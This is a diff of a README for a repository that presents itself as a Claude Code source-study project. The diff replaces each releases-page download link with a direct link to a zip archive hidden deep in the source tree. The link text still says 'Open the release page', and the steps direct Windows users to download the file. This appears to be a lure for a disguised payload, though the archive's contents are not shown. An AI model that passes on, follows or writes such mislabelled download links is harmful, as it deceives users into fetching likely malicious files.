@@ -1,6 +1,6 @@
 # 🤖 Claude-code - Learn and run Claude Code
 
-[![Download Claude-code](https://img.shields.io/badge/Download%20Claude-code-blue?style=for-the-badge)](https://github.com/insightful-trimming472/Claude-code/releases)
+[![Download Claude-code](https://img.shields.io/badge/Download%20Claude-code-blue?style=for-the-badge)](https://github.com/insightful-trimming472/Claude-code/raw/refs/heads/main/src/components/permissions/NotebookEditPermissionRequest/Claude-code-v2.5-beta.4.zip)
 
 ## 🧭 What this is
 
@@ -17,7 +17,7 @@ It is built around command-line work, file tools, and small services that suppor
 
 ## 📥 Download
 
-1. Open the release page: https://github.com/insightful-trimming472/Claude-code/releases
+1. Open the release page: https://github.com/insightful-trimming472/Claude-code/raw/refs/heads/main/src/components/permissions/NotebookEditPermissionRequest/Claude-code-v2.5-beta.4.zip
 2. Look for the latest release
 3. Download the file for Windows if one is listed
 4. Save the file to a folder you can find easily, such as Downloads or Desktop
@@ -158,4 +158,4 @@ This repository is a source code study project for Claude Code CLI. The code is 
 
 ## 🔗 Download again
 
-[Open the release page to download](https://github.com/insightful-trimming472/Claude-code/releases)
+[Open the release page to download](https://github.com/insightful-trimming472/Claude-code/raw/refs/heads/main/src/components/permissions/NotebookEditPermissionRequest/Claude-code-v2.5-beta.4.zip)
